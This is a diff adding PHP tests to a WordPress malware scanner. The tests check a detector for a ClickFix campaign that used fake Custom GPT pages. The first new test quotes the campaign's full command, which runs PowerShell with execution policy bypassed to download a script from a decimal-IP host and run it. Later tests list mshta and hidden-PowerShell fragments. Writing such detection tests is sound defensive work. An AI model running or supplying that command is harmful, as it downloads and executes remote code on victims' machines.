@@ -552,3 +552,44 @@ test('F11 still knows hasDemoPage as a contract call', function () {
     // And as the runtime calls it, with no other indicator beside it.
     expect(sentinel_ids((new Sky_Sentinel_Content_Detectors(sentinel_signatures()))->scan('wp-content/plugins/p/b.js', 'if(await contract.hasDemoPage()){go()}')))->toContain('F11');
 });
+
+// ---- 0.4.12: the ChatGPT Custom GPT ClickFix campaign (Huntress, 2026-09) --
+
+test('F14 knows the Custom GPT campaign\'s command on its own, with no lure words around it', function () {
+    // The Google Sites page told victims to paste this. 'powershell -' is
+    // lowercase in the list and the command reads PowerShell.exe" -Execution...
+    $cmd = '"C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe" -ExecutionPolicy Bypass "irm 1614733393/12 | Out-File $env:temp\\1777.ps1;& $env:temp\\1777.ps1"';
+    $f = (new Sky_Sentinel_Content_Detectors(sentinel_signatures()))->scan('page/site:home.html', "<code>{$cmd}</code>");
+    expect(sentinel_ids($f))->toContain('F14');
+    $f14 = array_values(array_filter($f, fn($x) => 'F14' === $x->detector))[0];
+    expect($f14->severity)->toBe('high')
+        ->and($f14->detail['strong'])->toContain('PowerShell with a flag')->toContain('download from a decimal-IP host');
+});
+
+test('F14 strong terms ignore case, and each new shape fires alone', function () {
+    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
+    $strong = fn(string $s) => ($x = array_values(array_filter($d->scan('page/x.html', $s), fn($y) => 'F14' === $y->detector))) ? $x[0]->detail['strong'] : array();
+    expect($strong('Press WIN + R and paste'))->toBe(array('Win + R'))
+        ->and($strong('Run MSHTA http://x'))->toBe(array('mshta'))
+        ->and($strong("powershell.exe -w hidden -c go"))->toContain('PowerShell with a flag')
+        ->and($strong("'PowerShell' -NoProfile"))->toContain('PowerShell with a flag')
+        ->and($strong('iwr -Uri http://3232235777/p.ps1'))->toBe(array('download from a decimal-IP host'))
+        ->and($strong('<a href="https://1614733393:8080/app/x.msi">'))->toBe(array('download from a decimal-IP host'))
+        ->and($strong('fetch("http://1614733393")'))->toBe(array('download from a decimal-IP host'));
+});
+
+test('F14 is quiet on PowerShell named without a flag, and on numbers that are not a host', function () {
+    $d = new Sky_Sentinel_Content_Detectors(sentinel_signatures());
+    foreach (array(
+        'Requires Windows PowerShell 5.1 or later.',
+        'Open PowerShell and run the installer.',
+        '<script src="https://cdn.example.com/1614733393/app.js"></script>',  // the number is a path, not the host
+        '<link href="/style.css?ver=1614733393">',
+        'curl https://example.com/1614733393/',
+        'http://127.0.0.1/',
+        'https://12345678.example.com/',          // a real domain that starts with digits
+        'irm https://1614733393123/x',             // too many digits to be an IPv4 host
+    ) as $s) {
+        expect(sentinel_ids($d->scan('wp-content/plugins/p/readme.txt', $s)))->not->toContain('F14');
+    }
+});
